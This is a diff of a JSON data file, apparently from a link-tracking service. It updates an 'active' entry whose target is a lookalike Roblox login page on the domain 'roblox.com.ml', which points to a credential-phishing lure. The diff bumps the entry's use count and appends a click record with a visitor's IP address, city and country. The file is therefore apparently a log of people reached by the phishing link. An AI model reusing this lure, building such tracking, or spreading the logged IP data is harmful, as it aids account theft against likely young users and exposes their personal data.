@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 523,
+    "useCount": 524,
     "createdBy": "admin",
     "clicks": [
       {
@@ -4296,6 +4296,14 @@
         "city": "Kitchener",
         "flag": "🇨🇦",
         "countryCode": "CA"
+      },
+      {
+        "timestamp": 1777089892330,
+        "ip": "172.56.180.142",
+        "country": "United States",
+        "city": "Riverside",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
